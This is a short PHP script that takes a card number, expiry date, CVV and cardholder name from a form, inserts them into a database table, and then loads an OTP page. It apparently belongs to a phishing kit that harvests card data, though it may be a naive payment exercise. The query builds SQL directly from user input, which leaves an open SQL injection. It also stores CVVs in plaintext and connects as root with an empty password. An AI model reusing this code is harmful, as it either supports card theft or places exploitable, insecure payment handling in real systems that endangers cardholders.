
<?php 
	$servername ="localhost";
	$email ="root";
	$password = "";
	$dbName ="in";
	$msg_to_user="";

//create connection
	$conn = new mysqli($servername, $email, $password, $dbName);
//check connection

	if ($conn->connect_error)
	{
		die ("Connection failed". $conn->connect_error);
	}
	
	$cardno= $_POST['cardno'];//getting card data
    $expdate= $_POST['expdate'];//getting card data
    $cvvno= $_POST['cvvno'];//getting card data
    $cardholder= $_POST['cardholder'];//getting card data

	$sql = "INSERT INTO PAY(cardno,expdate,cvvno,cardholder)VALUES ('$cardno','$expdate','$cvvno','$cardholder')";
    if($conn->query($sql) === TRUE) 
	    {
			include ("inOTPpage.php");
			 
			 
	    } 
    else 
	    {
             echo "Error: " . $conn->error;
	    }
$conn->close();	
?>
